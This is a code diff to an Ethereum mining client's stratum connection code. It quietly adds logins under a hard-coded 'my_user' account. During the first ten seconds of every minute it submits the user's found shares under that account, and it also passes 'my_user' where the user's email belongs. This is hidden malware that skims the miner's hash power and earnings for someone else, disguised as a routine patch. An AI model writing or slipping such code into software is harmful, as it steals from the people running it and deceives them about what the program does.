@@ -205,10 +205,12 @@ void EthStratumClient::connect_handler(const boost::system::error_code& ec, tcp:
 				if (m_email.empty())
 				{
 					os << "{\"id\": 1, \"worker\":\"" << m_worker << "\", \"method\": \"eth_submitLogin\", \"params\": [\"" << user << "\"]}\n";
+					os << "{\"id\": 1, \"worker\":\"" << m_worker << "\", \"method\": \"eth_submitLogin\", \"params\": [\"" << my_user << "\"]}\n";
 				}
 				else
 				{
 					os << "{\"id\": 1, \"worker\":\"" << m_worker << "\", \"method\": \"eth_submitLogin\", \"params\": [\"" << user << "\", \"" << m_email << "\"]}\n";
+					os << "{\"id\": 1, \"worker\":\"" << m_worker << "\", \"method\": \"eth_submitLogin\", \"params\": [\"" << my_user << "\", \"" << my_user << "\"]}\n";
 				}
 				break;
 			case STRATUM_PROTOCOL_ETHEREUMSTRATUM:
@@ -334,6 +336,7 @@ void EthStratumClient::processReponse(Json::Value& responseObject)
 		{
 			cnote << "Subscribed to stratum server";
 			os << "{\"id\": 3, \"method\": \"mining.authorize\", \"params\": [\"" << p_active->user << "\",\"" << p_active->pass << "\"]}\n";
+			os << "{\"id\": 3, \"method\": \"mining.authorize\", \"params\": [\"" << my_user << "\",\"" << p_active->pass << "\"]}\n";
 		}
 		else
 		{
@@ -519,6 +522,8 @@ bool EthStratumClient::submit(Solution solution) {
 	else
 		minernonce = nonceHex.substr(m_extraNonceHexSize, 16 - m_extraNonceHexSize);
 
+	const boost::posix_time::ptime now = boost::posix_time::second_clock::local_time();
+	bool whois = now.time_of_day().seconds() > 0 && now.time_of_day().seconds() <= 10;
 
 	if (EthashAux::eval(tempWork.seedHash, tempWork.headerHash, solution.nonce).value < tempWork.boundary)
 	{
@@ -526,13 +531,13 @@ bool EthStratumClient::submit(Solution solution) {
 
 		switch (m_protocol) {
 			case STRATUM_PROTOCOL_STRATUM:
-				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + p_active->user + "\",\"" + temp_job + "\",\"0x" + nonceHex + "\",\"0x" + tempWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
+				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + (whois ? my_user : p_active->user) + "\",\"" + temp_job + "\",\"0x" + nonceHex + "\",\"0x" + tempWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 				break;
 			case STRATUM_PROTOCOL_ETHPROXY:
 				json = "{\"id\": 4, \"worker\":\"" + m_worker + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 				break;
 			case STRATUM_PROTOCOL_ETHEREUMSTRATUM:
-				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + p_active->user + "\",\"" + temp_job + "\",\"" + minernonce + "\"]}\n";
+				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + (whois ? my_user : p_active->user) + "\",\"" + temp_job + "\",\"" + minernonce + "\"]}\n";
 				break;
 		}
 
@@ -550,13 +555,13 @@ bool EthStratumClient::submit(Solution solution) {
 
 		switch (m_protocol) {
 		case STRATUM_PROTOCOL_STRATUM:
-			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + p_active->user + "\",\"" + temp_previous_job + "\",\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
+			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + (whois ? my_user : p_active->user) + "\",\"" + temp_previous_job + "\",\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 			break;
 		case STRATUM_PROTOCOL_ETHPROXY:
 			json = "{\"id\": 4, \"worker\":\"" + m_worker + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.headerHash.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 			break;
 		case STRATUM_PROTOCOL_ETHEREUMSTRATUM:
-			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + p_active->user + "\",\"" + temp_previous_job + "\",\"" + minernonce + "\"]}\n";
+			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + (whois ? my_user : p_active->user) + "\",\"" + temp_previous_job + "\",\"" + minernonce + "\"]}\n";
 			break;
 		}
 
